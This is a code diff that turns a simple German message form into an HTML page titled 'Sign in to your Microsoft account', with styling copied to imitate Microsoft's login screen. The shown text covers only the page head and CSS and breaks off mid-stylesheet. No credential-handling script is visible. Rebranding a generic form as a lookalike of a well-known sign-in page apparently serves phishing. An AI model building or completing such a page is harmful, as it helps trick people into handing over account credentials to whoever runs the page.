@@ -1,115 +1,91 @@
 <!DOCTYPE html>
-<html lang="de">
+<html lang="en">
+
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Formular</title>
-
-  <style>
-    body {
-      font-family: Arial;
-      background: #111827;
-      color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-
-    .box {
-      background: #1f2937;
-      padding: 30px;
-      border-radius: 12px;
-      width: 300px;
-    }
-
-    input {
-      width: 100%;
-      padding: 10px;
-      margin-top: 10px;
-      border: none;
-      border-radius: 8px;
-    }
-
-    button {
-      width: 100%;
-      margin-top: 15px;
-      padding: 10px;
-      border: none;
-      border-radius: 8px;
-      background: #3b82f6;
-      color: white;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background: #2563eb;
-    }
-
-    .error {
-      color: #e81123;
-      font-size: 14px;
-      margin-top: 5px;
-    }
-
-    .success {
-      color: #107c10;
-      font-size: 14px;
-      margin-top: 5px;
-    }
-  </style>
-</head>
-
-<body>
-
-  <div class="box">
-    <h2>Nachricht senden</h2>
-
-    <input id="feld1" placeholder="Erstes Feld">
-    <input id="feld2" placeholder="Zweites Feld">
-    
-    <div id="message"></div>
-
-    <button onclick="senden()">Senden</button>
-  </div>
-
-  <script>
-    async function senden() {
-      const feld1 = document.getElementById("feld1").value;
-      const feld2 = document.getElementById("feld2").value;
-      const messageDiv = document.getElementById("message");
-
-      // Clear previous messages
-      messageDiv.textContent = "";
-
-      try {
-        const response = await fetch("/api/send", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            feld1,
-            feld2
-          })
-        });
-
-        if (response.ok) {
-          messageDiv.textContent = "Gesendet!";
-          messageDiv.className = "success";
-          document.getElementById("feld1").value = "";
-          document.getElementById("feld2").value = "";
-        } else {
-          messageDiv.textContent = "Fehler: " + response.status;
-          messageDiv.className = "error";
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="favicon.ico" />
+    <title>Sign in to your Microsoft account</title>
+    <style>
+        * {
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+            font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
         }
-      } catch (error) {
-        console.error("Fehler beim Senden:", error);
-        messageDiv.textContent = "Fehler beim Senden der Nachricht";
-        messageDiv.className = "error";
-      }
-    }
-  </script>
 
-</body>
-</html>
+        html,
+        body {
+            background-color: #e2e5d3;
+            color: #1b1b1b;
+        }
+
+        section{
+            display:table-cell;
+            vertical-align:middle;
+            height: 100vh;
+            width: 100rem;
+            max-width: 100%;
+        }
+
+        .title {
+            line-height: 1.75rem;
+            color: #1b1b1b;
+            font-size: 1.5rem;
+            font-weight: 600;
+        }
+
+        .auth-wrapper {
+            max-width: 440px;
+            width: calc(100% - 40px);
+            padding: 44px;
+            margin: auto;
+            margin-bottom: 28px;
+            background-color: #fff;
+            -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            min-width: 320px;
+        }
+
+        .opts {
+            padding: 10px 44px;
+            max-width: 440px;
+            cursor: pointer;
+            margin: auto;
+            background-color: #fff;
+            -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+        }
+
+        .opts:hover {
+            background-color: rgba(0, 0, 0, .1);
+        }
+
+        .input {
+            padding: 4px 8px;
+            border-style: solid;
+            border-width: 2px;
+            border-color: rgba(0, 0, 0, .4);
+            background-color: rgba(255, 255, 255, .4);
+            height: 32px;
+            height: 2rem;
+            padding: 6px 10px;
+            padding-left: 10px;
+            border-width: 1px;
+            border-top-width: 1px;
+            border-right-width: 1px;
+            border-left-width: 1px;
+            border-color: #666;
+            border-color: rgba(0, 0, 0, .6);
+            height: 36px;
+            outline: none;
+            border-radius: 0;
+            -webkit-border-radius: 0;
+            background-color: transparent;
+            border-top-width: 0;
+            border-left-width: 0;
+            border-right-width: 0;
+            padding*
